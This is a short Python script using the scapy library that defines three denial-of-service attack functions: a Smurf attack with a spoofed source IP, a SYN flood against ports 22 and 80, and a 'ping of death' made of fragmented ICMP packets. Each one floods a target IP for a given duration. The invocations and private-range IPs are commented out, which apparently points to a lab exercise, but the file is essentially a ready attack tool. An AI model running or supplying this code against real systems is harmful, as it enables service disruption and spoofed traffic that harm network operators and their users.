import scapy.all as scapy
import time

# IP_Source = '10.0.2.16'
# IP_Dest = '192.168.86.213'


def Smurf_Attack(IP_Source, IP_Dest, duree):
    """ Smurf attack
    Distributed denial of service (DDoS) attack in which an attacker attempts 
    to saturate a target server with ICMP packets

    Args:
        IP_Source (String): the IP of the source machine
        IP_Dest (String): the IP of the destination machine
        duree (int): the duration of the attack
    """
    print("Smurf attack on " + IP_Dest + " for " + str(duree) + " seconds")
    debut = time.time()
    while (time.time() - debut) < duree:
        scapy.send(scapy.IP(src=IP_Source, dst=IP_Dest)/scapy.ICMP())


def Syn_Flooding_Attack(IP_Dest, duree):
    """ Syn flooding attack
    Computer attack aiming at achieving a denial of service. 
    It is applied within the TCP protocol and consists in sending a succession of SYN requests to the target

    Args:
        IP_Dest (String): the IP of the destination machine
        duree (int): the duration of the attack
    """
    print("Syn flooding attack on " + IP_Dest +
          " for " + str(duree) + " seconds")
    topt = [('Timestamp', (10, 0))]
    p = scapy.IP(dst=IP_Dest, id=1111, ttl=99)/scapy.TCP(sport=scapy.RandShort(),
                                                         dport=[22, 80], seq=12345, ack=1000, window=1000, flags="S", options=topt)/"SYNFlood"
    debut = time.time()
    while (time.time() - debut) < duree:
        scapy.send(p)


def Ping_of_death(IP_Dest, duree):
    """ Ping of death attack
    Denial of service attack performed by sending a malformed ping packet to a target machine

    Args:
        IP_Dest (String): the IP of the destination machine
        duree (int): the duration of the attack
    """
    print("Ping of death attack on " + IP_Dest +
          " for " + str(duree) + " seconds")
    debut = time.time()
    while (time.time() - debut) < duree:
        scapy.send(scapy.fragment(
            scapy.IP(dst=IP_Dest)/scapy.ICMP()/('X' * 600)))


# Smurf_Attack(IP_Source, IP_Dest, 10)
# Syn_Flooding_Attack(IP_Dest, 10)
# Ping_of_death(IP_Dest, 10)
